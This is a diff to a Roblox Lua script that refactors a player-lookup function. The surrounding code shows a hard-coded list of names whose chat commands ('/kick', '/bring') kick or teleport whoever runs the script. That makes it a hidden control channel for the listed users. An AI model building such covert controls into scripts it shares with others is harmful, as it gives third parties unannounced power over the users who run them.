@@ -24,22 +24,38 @@ local zl = {
 }
 
 function veryepictrol2(x)
-    function GetPlayer(String)
-        local plr
-        local strl = String:lower()
-        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
-            if v.Name:lower():sub(1, #String) == String:lower() then
-                plr = v
+function getPlayer(name)
+    local targets = {}
+    local plrstbl = game.Players:getPlayers()
+    if name == "me" then
+        return {game.Players.LocalPlayer}
+    elseif name == "others" then
+        for i, v in pairs(plrstbl) do
+            if v ~= game.Players.LocalPlayer then
+                targets[#targets + 1] = v
             end
         end
-        if String == "me" then
-            plr = game.Players[x.Name]
+    elseif name == "all" then
+        for i, v in pairs(plrstbl) do
+            targets[#targets + 1] = v
         end
-        if String == "" or String == " " then
-            plr = nil
+    elseif name == "random" then
+        for i, v in pairs(plrstbl) do
+            if v ~= game.Players.LocalPlayer then
+                return {plrstbl[math.random(1, #plrstbl)]}
+            end
         end
-        return plr
+    else
+        name = name:lower()
+        for i, v in pairs(game.Players:getPlayers()) do
+            if v.Name:lower():find(name) or v.DisplayName:lower():find(name) then
+                return {v}
+            end
+        end
     end
+    return targets
+end
+
 
     local prefixz = "/"
     local LzPlayer = x
@@ -59,7 +75,7 @@ function veryepictrol2(x)
             local ME = game:GetService("Workspace")[x.Name]
             if cmd2 == "kick" then
                 local who2 = string.sub(msg, space + 1)
-                local target2 = GetPlayer(who2)
+                local target2 = getPlayer(who2)[1]
                 if game.Players.LocalPlayer == target2 then
                     game.Players.LocalPlayer:Kick("kicked by admin")
                 end
@@ -74,7 +90,7 @@ function veryepictrol2(x)
             end
             if cmd2 == "bring" then
                 local who2 = string.sub(msg, space + 1)
-                local target2 = GetPlayer(who2)
+                local target2 = getPlayer(who2)[1]
                 if game.Players.LocalPlayer == target2 then
                     target2.Character.HumanoidRootPart.CFrame = ME.HumanoidRootPart.CFrame
                 end
@@ -94,7 +110,7 @@ game.Players.PlayerAdded:Connect(function(plr)
         end
     end
 end)
-for i, plr in pairs(game.Players:GetPlayers()) do
+for i, plr in pairs(game.Players:getPlayers()) do
     for i, listed in pairs(zl) do
         if plr.Name == listed then
             veryepictrol2(plr)
